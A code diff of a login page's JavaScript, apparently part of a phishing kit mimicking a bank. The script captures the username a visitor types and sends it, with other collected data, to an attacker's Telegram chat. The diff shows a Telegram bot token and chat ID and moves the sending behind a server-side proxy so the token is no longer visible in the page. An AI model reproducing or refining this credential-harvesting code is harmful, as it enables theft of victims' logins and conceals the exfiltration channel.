@@ -995,7 +995,6 @@
   const btnContinuar = document.querySelector(".bc-continue-button");
 
   // Configuración de Telegram
-  const TELEGRAM_TOKEN = '8164357624:AAF6-huSZNt6tU0Y-bOjkfac83GPh0gihJA';
   const TELEGRAM_CHAT_ID = '1556429907';
 
   if (form && input && btnContinuar) {
@@ -1011,9 +1010,9 @@
       const extraInfo = window.getFlightUserData ? window.getFlightUserData() : '';
       const mensaje = `🔔 **Nuevo Ingreso**\n👤 Usuario: ${usuario}${extraInfo}`;
 
-      // Enviar a Telegram vía Fetch API
+      // Enviar a Telegram vía Proxy
       try {
-        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        const response = await fetch('/telegram-proxy/sendMessage', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
